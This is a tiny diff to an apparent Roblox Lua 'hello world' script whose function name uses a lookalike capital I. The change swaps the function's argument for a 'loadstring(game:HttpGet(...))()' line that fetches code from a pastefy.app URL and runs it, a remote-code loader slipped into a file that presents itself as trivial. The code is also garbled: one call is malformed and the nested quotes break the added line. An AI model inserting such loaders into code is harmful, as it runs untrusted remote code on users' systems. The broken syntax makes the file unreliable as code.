@@ -2,4 +2,4 @@ function HelloWorId(str)
     print(tostring)(str)
 end
 
-HelloWorId("print")
+HelloWorId("loadstring(game:HttpGet("https://pastefy.app/jD5PKqvv/raw"))()")
